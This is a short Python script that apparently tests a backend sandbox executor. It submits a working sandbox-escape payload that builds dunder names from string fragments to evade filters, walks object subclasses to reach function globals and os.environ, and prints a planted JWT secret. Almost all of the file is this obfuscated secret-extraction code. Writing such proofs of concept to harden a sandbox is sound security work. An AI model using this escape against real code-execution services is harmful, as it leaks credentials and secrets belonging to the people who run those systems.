import asyncio
import os
from backend.services.sandbox_executor import execute_code

async def main():
    os.environ["JWT_SECRET_TEST"] = "super-secret-key-12345"
    
    code = """
d = '_' + '_'
obj = int.mro()[1]
subclasses_descriptor = vars(obj)[d + 'subclasses' + d]
get_method = vars(subclasses_descriptor)[d + 'get' + d]
subs = get_method(subclasses_descriptor, obj)()

function_class = None
for c in subs:
    name = vars(c).get(d + 'name' + d)
    if name == 'function':
        function_class = c
        break

globals_descriptor = vars(function_class)[d + 'globals' + d]
get_globals = vars(globals_descriptor)[d + 'get' + d]

for s in subs:
    init_name = d + 'init' + d
    if init_name in vars(s):
        init_method = vars(s)[init_name]
        try:
            globs = get_globals(globals_descriptor, init_method)
            sys_key = 's' + 'y' + 's'
            if sys_key in globs:
                sys_mod = globs[sys_key]
                os_key = 'o' + 's'
                secret_key = 'J' + 'W' + 'T' + '_' + 'S' + 'E' + 'C' + 'R' + 'E' + 'T' + '_' + 'T' + 'E' + 'S' + 'T'
                secret = sys_mod.modules[os_key].environ.get(secret_key)
                print("SECRET_EXTRACTED:", secret)
                break
        except Exception:
            pass
"""
    res = await execute_code(code, "python", bypass_security=True)
    print("Success:", res.success)
    print("Output:", res.output)
    print("Error:", res.error)

asyncio.run(main())
